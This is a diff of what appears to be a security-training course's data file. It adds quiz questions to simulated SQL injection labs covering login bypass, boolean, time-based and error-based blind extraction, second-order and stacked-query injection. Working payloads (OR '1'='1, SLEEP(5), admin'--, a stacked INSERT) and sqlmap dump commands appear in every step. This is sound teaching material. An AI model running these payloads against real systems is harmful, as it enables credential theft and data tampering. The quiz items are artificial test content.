@@ -1,3 +1,5 @@
+import type { QuizQuestion } from './types';
+
 export interface SqlTable {
   name: string;
   columns: string[];
@@ -8,6 +10,7 @@ export interface SqlInjectionStep {
   command: string;
   output: string;
   explanation: string;
+  quiz?: QuizQuestion[];
 }
 
 export interface SqlInjectionTarget {
@@ -97,26 +100,156 @@ Follow the steps to prove the injection, then automate the heavy lifting with sq
         command: "curl -X POST http://10.0.0.50/login -d 'username=admin&password=anything'",
         output: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"success":false,"message":"Invalid credentials"}`,
         explanation: "Always start with a baseline test. We send a legitimate username with a wrong password to see how the application responds normally. This tells us the endpoint is live and gives us the standard error response, 'Invalid credentials', so we know what a failed login looks like. Without this step, we wouldn't be able to distinguish between a failed injection and a legitimate login failure.",
+        quiz: [
+          {
+            id: 'sqli-union-step1-q1',
+            question: 'Why establish a baseline request before attempting injection?',
+            options: [
+              'To warm up the server cache',
+              'To learn the normal response so injected failures can be distinguished from legitimate ones',
+              'To authenticate with the database',
+              'To disable WAF protections',
+            ],
+            correctIndex: 1,
+            explanation: 'The baseline shows the standard "Invalid credentials" response, giving a reference to tell failed injections apart from real login failures.',
+          },
+          {
+            id: 'sqli-union-step1-q2',
+            question: 'What does a normal failed-login response provide?',
+            options: [
+              'The exact SQL query written by the developer',
+              'A reference so we can tell an injection that worked from a legitimate auth failure',
+              'The database password in plaintext',
+              'A list of all table names',
+            ],
+            correctIndex: 1,
+            explanation: 'Knowing the normal failure format lets an attacker recognize when injection succeeds versus when a login genuinely fails.',
+          },
+        ],
       },
       {
         command: "curl -X POST http://10.0.0.50/login -d \"username=admin' OR '1'='1&password=anything\"",
         output: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"success":true,"message":"Login successful","user":{"id":1,"role":"administrator"}}`,
         explanation: "This is the breakthrough. The single quote closes the original query's string literal, and OR '1'='1' appends a condition that's always true, so the WHERE clause matches every row instead of just the admin. The application logs us in as the first user in the table, which happens to be the administrator. This confirms the input is being concatenated directly into SQL without sanitization, and the error response we saw earlier was actually a SQL error being caught by the application. We now have proof of concept for SQL injection and can escalate to full data extraction.",
+        quiz: [
+          {
+            id: 'sqli-union-step2-q1',
+            question: 'How does the payload username=admin\' OR \'1\'=\'1 bypass authentication?',
+            options: [
+              'It encrypts the password so the hash always matches',
+              'The quote closes the string and OR \'1\'=\'1 adds an always-true condition, matching every row',
+              'It disables the login endpoint',
+              'It rolls back the database transaction',
+            ],
+            correctIndex: 1,
+            explanation: 'Closing the string literal and appending an always-true OR makes the WHERE clause match every row, logging in as the first user.',
+          },
+          {
+            id: 'sqli-union-step2-q2',
+            question: 'What does a successful login OR \'1\'=\'1 confirm?',
+            options: [
+              'That the database is fully patched',
+              'That input is concatenated directly into SQL without sanitization',
+              'That the password is encrypted with bcrypt',
+              'That the server uses a WAF',
+            ],
+            correctIndex: 1,
+            explanation: 'When the injected condition changes query behavior, it proves the input reaches SQL unsanitized — the proof of concept for injection.',
+          },
+        ],
       },
       {
         command: "sqlmap -u 'http://10.0.0.50/login' --data='username=admin&password=test' --batch --dbs",
         output: `[*] starting @ ...\n[INFO] testing connection to the target URL\n[INFO] testing 'AND boolean-based blind'\n[INFO] the back-end DBMS is MySQL\n[INFO] fetching database names\navailable databases [3]:\n[*] information_schema\n[*] mysql\n[*] novacorp`,
         explanation: "Now we automate the exploitation. sqlmap confirms the backend is MySQL 8.0.35 and enumerates the available databases. We see 'novacorp', that's the application database we want. The 'information_schema' and 'mysql' databases are internal MySQL metadata, 'information_schema' contains all table/column names across every database, and 'mysql' stores user accounts. Knowing the DBMS type is critical because it determines which injection payloads and extraction techniques will work.",
+        quiz: [
+          {
+            id: 'sqli-union-step3-q1',
+            question: 'What does the "--dbs" flag in sqlmap do?',
+            options: [
+              'It drops the target database',
+              'It enumerates the available databases on the backend server',
+              'It enables verbose error logging',
+              'It disables the WAF',
+            ],
+            correctIndex: 1,
+            explanation: 'The --dbs option lists all databases so the attacker can select the application\'s database to dig into.',
+          },
+          {
+            id: 'sqli-union-step3-q2',
+            question: 'Why does knowing the DBMS type (e.g. MySQL) matter?',
+            options: [
+              'It determines which injection payloads and extraction techniques will work',
+              'It reveals the network administrator password',
+              'It automatically patches the vulnerability',
+              'It disables the database compilers',
+            ],
+            correctIndex: 0,
+            explanation: 'Different database engines support different syntax and functions, so payloads must be tailored to the backend DBMS.',
+          },
+        ],
       },
       {
         command: "sqlmap -u 'http://10.0.0.50/login' --data='username=admin&password=test' -D novacorp --tables",
         output: `[INFO] fetching tables for database 'novacorp'\nDatabase: novacorp\n[3 tables]\n+----------+\n| users    |\n| products |\n| orders   |\n+----------+`,
         explanation: "We drill into the novacorp database and find three tables. The 'users' table is our primary target, it likely contains credentials. 'products' and 'orders' could contain business-sensitive data like pricing and purchase history. At this stage we're mapping the database structure, just like a real attacker would. We're thinking about which table has the highest value for our objectives. The answer is obvious: users contains the passwords and emails that could be used for lateral movement.",
+        quiz: [
+          {
+            id: 'sqli-union-step4-q1',
+            question: 'Within a database, which table is typically the highest-value target?',
+            options: [
+              'The one with the most rows',
+              'The users/accounts table holding credentials and emails',
+              'The first table alphabetically',
+              'The one containing only metadata',
+            ],
+            correctIndex: 1,
+            explanation: 'Credential-holding tables enable lateral movement, phishing, and privilege escalation, making them the primary prize.',
+          },
+          {
+            id: 'sqli-union-step4-q2',
+            question: 'What does enumerating table names achieve during an attack?',
+            options: [
+              'It maps the database structure to prioritize which tables to extract',
+              'It patches all the injection flaws',
+              'It resets the database passwords',
+              'It disables foreign keys',
+            ],
+            correctIndex: 0,
+            explanation: 'Mapping tables reveals the schema so the attacker can decide which data yields the most value.',
+          },
+        ],
       },
       {
         command: "sqlmap -u 'http://10.0.0.50/login' --data='username=admin&password=test' -D novacorp -T users --dump",
         output: `[INFO] fetching entries for 'users'\nTable: users (3 entries)\n+----+--------------+--------------------------+---------------------+---------------+\n| id | username     | password                 | email               | role          |\n+----+--------------+--------------------------+---------------------+---------------+\n| 1  | admin        | $2y$10$xVqYLkR5pN3mXz8Q  | admin@novacorp.io   | administrator |\n| 2  | jdoe         | $2y$10$aB3dEfGhIjKlMnOp  | jdoe@novacorp.io    | user          |\n| 3  | backup_admin | $2y$10$pQ9rS8tUvWxYzA1b  | backup@novacorp.io  | admin         |\n+----+--------------+--------------------------+---------------------+---------------+`,
         explanation: "Full extraction. We now have every row from the users table, usernames, bcrypt password hashes, email addresses, and role assignments. Notice there are two admin accounts: 'admin' and 'backup_admin'. The backup_admin is especially interesting because organizations often have weaker security on backup accounts. The bcrypt hashes ($2y$10$) are strong against offline cracking, but we now have emails for phishing, usernames for brute-force attacks, and role info for privilege escalation. This single injection gave us everything we need to compromise the entire system.",
+        quiz: [
+          {
+            id: 'sqli-union-step5-q1',
+            question: 'Even though bcrypt hashes resist offline cracking, why is the dump still dangerous?',
+            options: [
+              'The emails feed phishing, usernames feed brute-force, and roles reveal privilege-escalation paths',
+              'bcrypt hashes decrypt instantly',
+              'The dump disables two-factor authentication',
+              'It exposes TLS private keys',
+            ],
+            correctIndex: 0,
+            explanation: 'Exfiltrated emails, usernames, and role data enable phishing, credential attacks, and privilege escalation even when hashes stay secure.',
+          },
+          {
+            id: 'sqli-union-step5-q2',
+            question: 'Why are extra admin/backup accounts like backup_admin worth attention?',
+            options: [
+              'Organizations often secure backup accounts more weakly than primary ones',
+              'They are encrypted with weaker algorithms',
+              'They bypass the password check entirely',
+              'They always share the web-server credentials',
+            ],
+            correctIndex: 0,
+            explanation: 'Secondary/backup admin accounts frequently receive less hardening, offering a softer privilege-escalation target.',
+          },
+        ],
       },
     ],
     cpReward: 200,
@@ -163,21 +296,125 @@ We'll manually confirm the boolean oracle with \`1=1\` and \`1=2\`, then let sql
         command: "curl 'http://10.0.0.50/api/search?id=1'",
         output: `HTTP/1.1 200 OK\n{"found":true,"product":"Security Camera"}`,
         explanation: "First, we establish the baseline behavior. A normal request with a valid product ID returns a product. This tells us the API is working and gives us the standard 'found: true' response to compare against. We're looking for any difference in this response when we inject SQL: that difference is our oracle.",
+        quiz: [
+          {
+            id: 'sqli-blind-step1-q1',
+            question: 'In blind injection, what serves as the "oracle"?',
+            options: [
+              'Any observable difference between a true and a false condition in the response',
+              'The database\'s error log',
+              'The TLS certificate',
+              'The server version banner',
+            ],
+            correctIndex: 0,
+            explanation: 'An oracle is any response difference the attacker can observe to distinguish true from false conditions.',
+          },
+          {
+            id: 'sqli-blind-step1-q2',
+            question: 'What response does this search API give for a valid product ID?',
+            options: [
+              'A stack trace with table names',
+              'A boolean indicator like found: true plus the product',
+              'The full SQL query',
+              'The database password',
+            ],
+            correctIndex: 1,
+            explanation: 'The endpoint returns only found/not-found style output — exactly the minimal binary signal blind injection relies on.',
+          },
+        ],
       },
       {
         command: "curl 'http://10.0.0.50/api/search?id=1 AND 1=1'",
         output: `{"found":true,"product":"Security Camera"}`,
         explanation: "We inject a condition that's always true: 1=1. The response is identical to the baseline, same product, same 'found: true'. This is expected, and it tells us two things: the injected SQL is being executed (not treated as a literal string), and the true condition produces the same output as a normal query. We now have our 'true' baseline for comparison.",
+        quiz: [
+          {
+            id: 'sqli-blind-step2-q1',
+            question: 'What does injecting "AND 1=1" and getting a normal response confirm?',
+            options: [
+              'That the input is treated as a literal string',
+              'That the injected SQL is being executed and true matches the normal output',
+              'That the database is down',
+              'That the WAF blocked the request',
+            ],
+            correctIndex: 1,
+            explanation: 'A true condition reproducing the baseline response proves the injected SQL runs and defines the "true" output.',
+          },
+          {
+            id: 'sqli-blind-step2-q2',
+            question: 'Why establish an "always true" baseline in blind injection?',
+            options: [
+              'To have a reference for what a true condition should look like',
+              'To brute-force the admin password',
+              'To disable query caching',
+              'To identify the database version',
+            ],
+            correctIndex: 0,
+            explanation: 'The true baseline lets the attacker compare later guesses: matching "true" output means the injected guess is correct.',
+          },
+        ],
       },
       {
         command: "curl 'http://10.0.0.50/api/search?id=1 AND 1=2'",
         output: `{"found":false}`,
         explanation: "Now we inject a condition that's always false: 1=2. The response changes to 'found: false', no product returned. This is the critical proof. The only difference between this request and the last was the injected condition, and the response changed accordingly. We've confirmed boolean-based blind SQL injection. Any condition we inject can be tested: if the product appears, the condition is true; if not, it's false. This is our oracle for extracting data one bit at a time.",
+        quiz: [
+          {
+            id: 'sqli-blind-step3-q1',
+            question: 'Why does "AND 1=2" returning found: false confirm the injection?',
+            options: [
+              'Because the false condition produces a different response than the true baseline, proving SQL execution',
+              'Because it reveals the table schema in the output',
+              'Because it triggers a server crash',
+              'Because it signs the session cookie',
+            ],
+            correctIndex: 0,
+            explanation: 'The response changed solely due to the injected condition — a functioning boolean oracle proving injection.',
+          },
+          {
+            id: 'sqli-blind-step3-q2',
+            question: 'How does an attacker use a boolean oracle to extract data?',
+            options: [
+              'By testing conditions one at a time to reconstruct data character by character',
+              'By dumping the whole table in a single request',
+              'By reading the server-side error logs',
+              'By disabling the database foreign keys',
+            ],
+            correctIndex: 0,
+            explanation: 'Each true/false guess yields one bit, so data is rebuilt across many requests.',
+          },
+        ],
       },
       {
         command: "sqlmap -u 'http://10.0.0.50/api/search?id=1' --batch --technique=B --dbs",
         output: `[INFO] testing 'AND boolean-based blind'\n[INFO] the back-end DBMS is MySQL\navailable databases [2]:\n[*] information_schema\n[*] novacorp`,
         explanation: "sqlmap automates the tedious process of asking yes/no questions. Using the boolean-based technique, it systematically extracts database names by testing character values one at a time. We see two databases: 'information_schema' (MySQL's internal metadata) and 'novacorp' (the application database). The accounts table inside novacorp contains user balances, an attacker could use this to identify high-value targets for financial fraud or privilege escalation.",
+        quiz: [
+          {
+            id: 'sqli-blind-step4-q1',
+            question: 'What does SQLmap\'s --technique=B automate?',
+            options: [
+              'Error-based extraction through MySQL warnings',
+              'Boolean-based blind extraction by asking true/false questions character by character',
+              'Stacked INSERT statements',
+              'Timing attacks using SLEEP()',
+            ],
+            correctIndex: 1,
+            explanation: 'Technique B automates boolean blind injection, reconstructing data from yes/no responses.',
+          },
+          {
+            id: 'sqli-blind-step4-q2',
+            question: 'Why would an attacker target the accounts table for financial fraud?',
+            options: [
+              'It contains user balances used to identify high-value targets',
+              'It stores the primary TLS keys',
+              'It lists the web-server software',
+              'It holds the domain registrar data',
+            ],
+            correctIndex: 0,
+            explanation: 'Financial data (balances, account types) reveals high-value accounts and enables fraud and privilege escalation.',
+          },
+        ],
       },
     ],
     cpReward: 300,
@@ -223,16 +460,94 @@ We'll measure a baseline with the \`time\` command, prove the injection with \`S
         command: "time curl 'http://10.0.0.50/api/user?user=admin'",
         output: `real\t0m0.032s\nuser\t0m0.010s\nsys\t0m0.005s`,
         explanation: "We start by measuring the baseline response time. The API responds in about 32 milliseconds, essentially instant. This is our reference point. Any injection that causes a noticeable delay beyond this baseline tells us the injected SQL is being executed. If the response time doesn't change, our injection isn't working. We're establishing the 'normal' before we introduce chaos.",
+        quiz: [
+          {
+            id: 'sqli-time-step1-q1',
+            question: 'Why measure a baseline response time before time-based injection?',
+            options: [
+              'To have a reference so injected delays are distinguishable from normal traffic',
+              'To fill the API rate limit',
+              'To identify the database brand',
+              'To flush the connection pool',
+            ],
+            correctIndex: 0,
+            explanation: 'The baseline establishes normal latency so any injected delay clearly indicates our SQL is executing.',
+          },
+          {
+            id: 'sqli-time-step1-q2',
+            question: 'What makes time-based blind injection so stealthy?',
+            options: [
+              'It causes visible errors and log entries',
+              'It returns no error and no data change, only a subtle response delay',
+              'It triggers the IDS immediately',
+              'It reveals table names in the body',
+            ],
+            correctIndex: 1,
+            explanation: 'No errors and no output changes occur — only timing, which automated scanners often overlook.',
+          },
+        ],
       },
       {
         command: "time curl 'http://10.0.0.50/api/user?user=admin' AND SLEEP(5)--'",
         output: `real\t0m5.041s\nuser\t0m0.012s\nsys\t0m0.008s`,
         explanation: "We inject AND SLEEP(5)-- which tells MySQL to pause for 5 seconds before continuing. The response now takes 5 seconds, a clear, measurable delay that proves the SLEEP function was executed. The trailing '--' comments out the rest of the original query to prevent syntax errors. We've confirmed time-based blind injection. Now we can use conditional logic: 'IF(condition, SLEEP(5), 0)' to make the database delay only when our condition is true. By measuring whether the response is slow or fast, we extract one bit of information per request.",
+        quiz: [
+          {
+            id: 'sqli-time-step2-q1',
+            question: 'What does a 5-second delay from "AND SLEEP(5)" prove?',
+            options: [
+              'That the SLEEP function executed, confirming time-based blind injection',
+              'That the server is overloaded with traffic',
+              'That the WAF blocked the query',
+              'That the connection timed out',
+            ],
+            correctIndex: 0,
+            explanation: 'The measurable delay proves our SQL ran, since SLEEP() pauses execution for the specified time.',
+          },
+          {
+            id: 'sqli-time-step2-q2',
+            question: 'How does "IF(condition, SLEEP(5), 0)" let an attacker extract data?',
+            options: [
+              'A slow response means the condition is true, a fast response means false — one bit per request',
+              'It instantly dumps the whole table',
+              'It rounds response times to the nearest second',
+              'It disables the condition checks',
+            ],
+            correctIndex: 0,
+            explanation: 'Conditional delays turn timing into a boolean oracle: slow=true, fast=false, reconstructing data bit by bit.',
+          },
+        ],
       },
       {
         command: "sqlmap -u 'http://10.0.0.50/api/user?user=admin' --batch --technique=T --dbs",
         output: `[INFO] testing 'time-based blind'\n[INFO] the back-end DBMS is MySQL\n[INFO] retrieved database names\navailable databases [2]:\n[*] information_schema\n[*] novacorp`,
         explanation: "sqlmap automates the time-based extraction by sending thousands of requests, each measuring whether the response was delayed. It extracts the database name character by character: 'Is the first letter n? Yes. Is the second letter o? Yes. Is the third letter v? Yes...', until it reconstructs 'novacorp'. The credentials table inside contains an API key (sk-nova-xxxxxxxxxxxx) and a service account password hash. In a real attack, this API key could grant access to NovaCorp's internal APIs, bypassing authentication entirely. Time-based injection is slow but silent, the perfect exfiltration method.",
+        quiz: [
+          {
+            id: 'sqli-time-step3-q1',
+            question: 'Which sqlmap technique flag automates time-based extraction?',
+            options: [
+              '--technique=B for boolean-based',
+              '--technique=T for time-based',
+              '--technique=E for error-based',
+              '--technique=U for UNION-based',
+            ],
+            correctIndex: 1,
+            explanation: 'T selects the time-based blind technique, automating the slow character-by-character extraction.',
+          },
+          {
+            id: 'sqli-time-step3-q2',
+            question: 'Why is an exfiltrated API key so dangerous?',
+            options: [
+              'It can grant access to internal APIs, bypassing authentication entirely',
+              'It only affects the marketing site',
+              'It resets after 24 hours',
+              'It is encrypted with the session key',
+            ],
+            correctIndex: 0,
+            explanation: 'A leaked API key authenticates directly to internal services, skipping login and other controls.',
+          },
+        ],
       },
     ],
     cpReward: 400,
@@ -279,16 +594,94 @@ We'll trigger the error with a single quote to confirm the leak, then use sqlmap
         command: "curl 'http://10.0.0.50/products?category=cameras'",
         output: `[{"id":1,"name":"Security Camera","category":"cameras"},{"id":2,"name":"Dash Cam","category":"cameras"}]`,
         explanation: "A normal request with a valid category returns the expected product list. This tells us the application is functioning and gives us the baseline response format. JSON arrays of product objects. We need to understand the normal output before we can detect when our injection causes something abnormal.",
+        quiz: [
+          {
+            id: 'sqli-error-step1-q1',
+            question: 'Why capture the normal response before injecting a quote?',
+            options: [
+              'To detect abnormal output when the injection breaks the query',
+              'To warm the query cache',
+              'To authenticate database users',
+              'To disable error reporting',
+            ],
+            correctIndex: 0,
+            explanation: 'Knowing the normal format lets us recognize when injected input alters the query or surfaces errors.',
+          },
+          {
+            id: 'sqli-error-step1-q2',
+            question: 'What is the baseline response format for this catalog endpoint?',
+            options: [
+              'A JSON array of product objects',
+              'A single error stack trace',
+              'An XML document',
+              'An HTML login form',
+            ],
+            correctIndex: 0,
+            explanation: 'Normal requests return JSON product arrays, the reference against which anomalies are judged.',
+          },
+        ],
       },
       {
         command: "curl 'http://10.0.0.50/products?category=camera%27'",
         output: `{"error":"You have an error in your SQL syntax near ''cameras'' at line 1"}`,
         explanation: "The single quote breaks the SQL query and the application returns the full MySQL error. This is a critical finding: the error message reveals the exact query structure, showing us how the category parameter is being concatenated into the query. An attacker now knows the table has a 'category' column and can craft precise injection payloads. In production, error messages should be logged server-side and never shown to users, this misconfiguration is a direct vulnerability.",
+        quiz: [
+          {
+            id: 'sqli-error-step2-q1',
+            question: 'Why is a verbose SQL error message a serious misconfiguration?',
+            options: [
+              'It reveals query structure, table names, and columns, eliminating guesswork for the attacker',
+              'It slows down the database server',
+              'It encrypts all the data',
+              'It disables the injection flaw automatically',
+            ],
+            correctIndex: 0,
+            explanation: 'Verbose errors leak the exact SQL, letting attackers craft precise payloads without guessing.',
+          },
+          {
+            id: 'sqli-error-step2-q2',
+            question: 'What does the returned error reveal about the query?',
+            options: [
+              'How the category parameter is concatenated into the SQL and the column names used',
+              'The database administrator\'s password',
+              'The TLS private key',
+              'The server\'s physical location',
+            ],
+            correctIndex: 0,
+            explanation: 'The syntax error text shows exactly where and how the parameter is embedded and names the columns being compared.',
+          },
+        ],
       },
       {
         command: "sqlmap -u 'http://10.0.0.50/products?category=cameras' --batch --technique=E -D novacorp -T secrets --dump",
         output: `[INFO] testing error-based\n[INFO] the back-end DBMS is MySQL\nTable: secrets (2 entries)\n+----+------------+----------------+\n| id | key_name   | key_value      |\n+----+------------+----------------+\n| 1  | db_password| Sup3rS3cret!   |\n| 2  | api_token  | tok_nv_xxxx    |\n+----+------------+----------------+`,
         explanation: "sqlmap uses error-based extraction to pull the entire secrets table through the error response. We now have two critical pieces of information: a database password ('Sup3rS3cret!') and an API token ('tok_nv_xxxxxxxxxxxx'). The database password could be used to connect directly to the database from anywhere on the network, bypassing the application entirely. The API token could grant access to internal services. This is why error-based injection is so dangerous, it's fast, reliable, and leaves clear evidence of data exfiltration in the error logs.",
+        quiz: [
+          {
+            id: 'sqli-error-step3-q1',
+            question: 'How does error-based extraction return data to the attacker?',
+            options: [
+              'By forcing MySQL to embed extracted data directly into the error message',
+              'By sending the data over a separate channel',
+              'By writing data to the web server log only',
+              'By returning it in the HTTP response headers',
+            ],
+            correctIndex: 0,
+            explanation: 'Functions like UPDATEXML()/EXTRACTVALUE() force MySQL to include the requested data in the error text returned to the client.',
+          },
+          {
+            id: 'sqli-error-step3-q2',
+            question: 'Which sqlmap technique extracts data through errors?',
+            options: [
+              '--technique=E for error-based',
+              '--technique=T for time-based',
+              '--technique=B for boolean-based',
+              '--technique=U for UNION-based',
+            ],
+            correctIndex: 0,
+            explanation: 'Technique E drives MySQL into erroring with the requested data embedded in each message.',
+          },
+        ],
       },
     ],
     cpReward: 300,
@@ -334,16 +727,94 @@ Register with the malicious username first, then log in with it, the stored payl
         command: "curl -X POST http://10.0.0.50/register -d 'username=testuser&password=pass123&email=test@test.com'",
         output: `{"success":true,"message":"Registration successful"}`,
         explanation: "We start with a normal registration to understand the application flow. This tells us the registration endpoint is working and shows us the standard success response. More importantly, it confirms that usernames are being stored in the database, the payload we inject next will be persisted and used later. We're setting up the conditions for a delayed attack.",
+        quiz: [
+          {
+            id: 'sqli-second-step1-q1',
+            question: 'Why register a normal account before the malicious one?',
+            options: [
+              'To confirm usernames are stored in the database, setting up the later re-use of an injected payload',
+              'To earn bonus loyalty points',
+              'To disable input validation',
+              'To seed the query cache',
+            ],
+            correctIndex: 0,
+            explanation: 'Confirming storage behavior assures the attacker the injected payload will persist and run on a later query.',
+          },
+          {
+            id: 'sqli-second-step1-q2',
+            question: 'What is the defining property of a second-order injection?',
+            options: [
+              'The payload executes immediately in the same query',
+              'The payload is stored and executed later in a different query',
+              'It only works on NoSQL databases',
+              'It requires physical access',
+            ],
+            correctIndex: 1,
+            explanation: 'Second-order injection plants a stored payload that executes when it is later used in a separate query.',
+          },
+        ],
       },
       {
         command: "curl -X POST http://10.0.0.50/register -d \"username=admin'-- &password=pass123&email=evil@evil.com\"",
         output: `{"success":true,"message":"Registration successful"}`,
         explanation: "The registration succeeds, but the payload is now stored in the database. The username admin'-- contains a SQL injection: the single quote closes the login query's string, and -- comments out the password check. The application doesn't validate or sanitize this input, so it's stored exactly as provided. At this point, nothing seems wrong. The vulnerability is dormant. The real exploitation happens when someone, including the application itself, tries to use this stored username in a login query.",
+        quiz: [
+          {
+            id: 'sqli-second-step2-q1',
+            question: 'Why does the malicious registration appear harmless at first?',
+            options: [
+              'The payload is only stored and does not execute during the registration query',
+              'It immediately escalates privileges',
+              'It triggers the IDS',
+              'It encrypts the stored data',
+            ],
+            correctIndex: 0,
+            explanation: 'Because the payload is only persisted, not evaluated, the registration returns success and looks normal.',
+          },
+          {
+            id: 'sqli-second-step2-q2',
+            question: 'Why do automated scanners often miss second-order injection?',
+            options: [
+              'Because they test each endpoint in isolation and miss the stored payload\'s later use',
+              'Because they only check GET requests',
+              'Because it cannot be automated at all',
+              'Because the payload self-destructs on storage',
+            ],
+            correctIndex: 0,
+            explanation: 'The flaw spans two endpoints — injection at one, execution at another — so isolated endpoint tests miss it.',
+          },
+        ],
       },
       {
         command: "curl -X POST http://10.0.0.50/login -d \"username=admin'-- &password=anything\"",
         output: `{"success":true,"message":"Login successful","user":{"id":1,"role":"administrator"}}`,
         explanation: "The stored payload executes during login. When the application reads our malicious username from the database and inserts it into the login query, the SQL becomes: WHERE username = 'admin'--' AND password = 'anything'. The '--' comments out everything after it, including the password check. We're now logged in as the administrator with any password. This is second-order injection in action, the vulnerability was stored during registration and triggered during login. The attacker never needs to be online for both steps; the trap is already set.",
+        quiz: [
+          {
+            id: 'sqli-second-step3-q1',
+            question: 'How does the stored username admin\'-- bypass the login password check?',
+            options: [
+              'The -- comments out the rest of the login query, including the password comparison',
+              'It encrypts the password to match the hash',
+              'It disables the users table',
+              'It resets the administrator\'s credentials',
+            ],
+            correctIndex: 0,
+            explanation: 'When interpolated into the login query, the -- comment swallows the password condition, logging in as admin.',
+          },
+          {
+            id: 'sqli-second-step3-q2',
+            question: 'Where does the second-order payload actually execute?',
+            options: [
+              'During the later login query, not the registration query that stored it',
+              'Immediately during registration',
+              'On the web server at boot',
+              'In the TLS handshake',
+            ],
+            correctIndex: 0,
+            explanation: 'The dormant payload detonates when the stored username is reused in the login query.',
+          },
+        ],
       },
     ],
     cpReward: 400,
@@ -389,16 +860,94 @@ Append a semicolon-terminated \`INSERT\` to the order ID parameter, then query t
         command: "curl 'http://10.0.0.50/api/order?id=1'",
         output: `{"id":1,"product":"Camera","amount":299.99,"status":"completed"}`,
         explanation: "A normal request returns the expected order details. This tells us the API is functioning and gives us the response format. We need to understand the normal output so we can verify our injection worked. The order has an amount field, that's our target for manipulation.",
+        quiz: [
+          {
+            id: 'sqli-stacked-step1-q1',
+            question: 'How do stacked queries differ from UNION-based injection?',
+            options: [
+              'They execute entirely independent statements (INSERT/UPDATE/DELETE) instead of combining results',
+              'They only read a single column',
+              'They are limited to HTTP headers',
+              'They cannot modify data',
+            ],
+            correctIndex: 0,
+            explanation: 'Stacked queries use a semicolon to run independent statements, enabling writes, not just reads.',
+          },
+          {
+            id: 'sqli-stacked-step1-q2',
+            question: 'What can a stacked-query attacker do that a UNION attacker cannot?',
+            options: [
+              'Modify data via INSERT/UPDATE/DELETE and even DROP TABLE',
+              'Only append to SELECT results',
+              'Only read the first row',
+              'Only enumerate table names',
+            ],
+            correctIndex: 0,
+            explanation: 'Stacked queries grant full write/administrative control over the database, unlike read-only UNION injection.',
+          },
+        ],
       },
       {
         command: "curl 'http://10.0.0.50/api/order?id=1;INSERT INTO orders(user_id,product,amount,status) VALUES(99,'hacked',0.01,'injected')--'",
         output: `{"success":true}`,
         explanation: "We inject a semicolon to terminate the original query, then append a complete INSERT statement. The semicolon tells MySQL to execute two separate queries: first the original order lookup, then our malicious INSERT. The '--' comments out any trailing syntax from the original query. The INSERT creates a new order record with a user_id of 99 (nonexistent), a product called 'hacked', an amount of $0.01, and status 'injected'. This demonstrates how an attacker could create fraudulent orders, modify pricing, or insert backdoor records, all without triggering errors.",
+        quiz: [
+          {
+            id: 'sqli-stacked-step2-q1',
+            question: 'What role does the semicolon play in a stacked-query attack?',
+            options: [
+              'It terminates the first query so a second, independent statement can run',
+              'It cancels the injected statement',
+              'It comments out the payload',
+              'It concatenates two string literals',
+            ],
+            correctIndex: 0,
+            explanation: 'A semicolon separates the original query from the attacker\'s appended statement, letting both execute.',
+          },
+          {
+            id: 'sqli-stacked-step2-q2',
+            question: 'Why does the app appear to work normally while stacked queries run?',
+            options: [
+              'The app returns only the first query\'s result while the malicious ones run silently',
+              'The query triggers a visible error',
+              'The app logs the injection to a public page',
+              'The injected statement blocks the connection',
+            ],
+            correctIndex: 0,
+            explanation: 'Only the first statement\'s output is returned; the injected operations execute without visible feedback.',
+          },
+        ],
       },
       {
         command: "curl 'http://10.0.0.50/api/order?id=2'",
         output: `{"id":2,"product":"hacked","amount":0.01,"status":"injected"}`,
         explanation: "We verify the injected record exists by querying for it. The new order is there, our INSERT statement executed successfully. This confirms the application is vulnerable to stacked queries injection. In a real attack scenario, this could be used for: financial fraud (modifying order amounts), data manipulation (changing user roles or balances), privilege escalation (inserting admin accounts), or even data destruction (DROP TABLE). The fact that the application returns success without any errors shows that stacked queries are fully supported by the database driver.",
+        quiz: [
+          {
+            id: 'sqli-stacked-step3-q1',
+            question: 'Why is verifying the injected record important?',
+            options: [
+              'It confirms the appended statement actually executed',
+              'It patches the vulnerability',
+              'It clears the database audit log',
+              'It rotates the database password',
+            ],
+            correctIndex: 0,
+            explanation: 'Reading back the injected row proves the stacked statement ran and the technique is viable.',
+          },
+          {
+            id: 'sqli-stacked-step3-q2',
+            question: 'Which of the following is a real-world stacked-query abuse?',
+            options: [
+              'Privilege escalation by inserting admin accounts',
+              'Resetting the TLS certificate',
+              'Disabling the IDS alerts',
+              'Encrypting the web root',
+            ],
+            correctIndex: 0,
+            explanation: 'Stacked queries can insert admin accounts, change balances, and plant persistent backdoor records.',
+          },
+        ],
       },
     ],
     cpReward: 300,
